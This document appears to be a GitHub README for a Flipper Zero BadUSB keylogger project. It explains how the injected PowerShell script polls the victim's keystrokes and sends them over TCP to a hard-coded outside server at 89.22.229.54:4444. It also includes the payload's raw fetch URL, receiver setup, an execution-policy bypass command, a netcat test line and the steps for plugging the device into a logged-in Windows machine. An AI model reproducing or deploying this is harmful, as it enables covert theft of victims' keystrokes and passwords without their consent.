# flipper-keylogger

Flipper Zero BadUSB loads `keylogger.ps1` from this repo (GitHub raw) and sends keystrokes to **89.22.229.54:4444** over TCP.

| File | Role |
|------|------|
| `keylogger.ps1` | Key poll + TCP exfil (raw URL target) |
| `payload.txt` | DuckyScript / Flipper BadUSB injector |
| `server/receiver.py` | TCP listener (Linux VPS) |
| `server/receiver.ps1` | TCP listener (Windows) |

## Raw URL

```
https://raw.githubusercontent.com/naturalniyaboba2077/flipper-keylogger/main/keylogger.ps1
```

## 1. Server (VPS `89.22.229.54`)

```bash
cd server
python3 receiver.py
# firewall:
#   ufw allow 4444/tcp
# logs:
#   tail -f logs/live.log
```

Test:

```bash
printf 'hello' | nc 89.22.229.54 4444
```

## 2. Local test (no Flipper)

```powershell
powershell -NoP -Ep Bypass -File .\keylogger.ps1
# type keys; watch server live.log
```

## 3. Flipper

1. Copy `payload.txt` → SD `badusb/payload.txt` (or `badusb/kl.txt`)
2. Keyboard layout **EN (US)** on target
3. BadUSB → Run → plug into logged-in Windows with network

## Config

Edit only top of `keylogger.ps1`:

- `$ServerIP` / `$ServerPort` (default `89.22.229.54` / `4444`)
- `$FlushEvery`, `$TimerMs`

Push to `main` after edits so raw updates (CDN may cache a few minutes).

## Offline buffer

If TCP fails, data goes to `%TEMP%\kl.buf` and is retried on the interval timer.

## Notes

- No admin required (user-session key poll).
- HTTP/S not used for exfil — plain TCP:4444.
- GitHub must stay public (or raw needs auth — not in this payload).
- Long BadUSB strings need EN layout and enough `DELAY` after plug.
